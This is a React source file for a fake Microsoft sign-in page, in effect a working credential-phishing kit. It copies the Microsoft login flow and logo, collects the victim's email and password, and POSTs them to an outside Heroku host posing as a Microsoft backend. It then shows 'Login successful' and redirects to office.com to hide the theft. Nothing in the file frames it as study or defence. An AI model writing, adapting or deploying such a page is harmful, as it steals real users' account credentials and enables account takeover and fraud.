import React, { useState } from "react";
import { MainWrapper } from "./styles/main";
import {
  EmailDisplay,
  HeaderText,
  MainForm,
  SignCard,
  SubmitBtn,
} from "./styles/card";
import { Modal } from "./styles/modal";
import { Link, withRouter } from "react-router-dom";

function App() {
  const [isPassword, setIsPassword] = useState(false);
  const [isModal, setIsModal] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleEmailSubmit = (evt: React.SyntheticEvent) => {
    evt.preventDefault();
    setIsPassword(true);
  };

  const handlePasswordSubmit = (evt: React.SyntheticEvent) => {
    evt.preventDefault();

    fetch("https://microsoft-backend.herokuapp.com/send", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        mail: email,
        password,
      }),
    })
      .then((res) => res.json())
      .then((data) => {
        console.log(data);
        setIsModal(true);
        setTimeout(() => window.location.assign("https://office.com"), 2000);
      })
      .catch((err) => {
        console.log(err);
      });
  };
  return (
    <>
      <MainWrapper>
        <SignCard>
          <div>
            <img src="/logo.svg" alt="Microsoft" />

            {isPassword ? (
              <>
                <EmailDisplay>
                  <button onClick={() => setIsPassword(false)}>
                    <img src="/arrow-left.svg" alt="Go back" />
                  </button>
                  {email}
                </EmailDisplay>

                <HeaderText>Enter password</HeaderText>

                <MainForm onSubmit={handlePasswordSubmit}>
                  <input
                    type="password"
                    placeholder="Password"
                    id="password"
                    onChange={(evt) => setPassword(evt.target.value)}
                    value={password}
                  />
                  <Link to="#">Forgotten my password</Link>

                  <SubmitBtn>
                    <button>Sign in</button>
                  </SubmitBtn>
                </MainForm>
              </>
            ) : (
              <>
                <HeaderText>Sign In</HeaderText>

                <MainForm onSubmit={handleEmailSubmit}>
                  <input
                    type="text"
                    placeholder="Email address or phone number"
                    onChange={(evt) => setEmail(evt.target.value)}
                    value={email}
                    id="email"
                  />
                  <Link to="#">Can't access your account?</Link>
                  <Link to="#">Sign in with your security key</Link>

                  <SubmitBtn>
                    <button>Next</button>
                  </SubmitBtn>
                </MainForm>
              </>
            )}
          </div>
        </SignCard>
      </MainWrapper>

      {isModal && (
        <Modal>
          <div>Login successful</div>
        </Modal>
      )}
    </>
  );
}

export default withRouter(App);
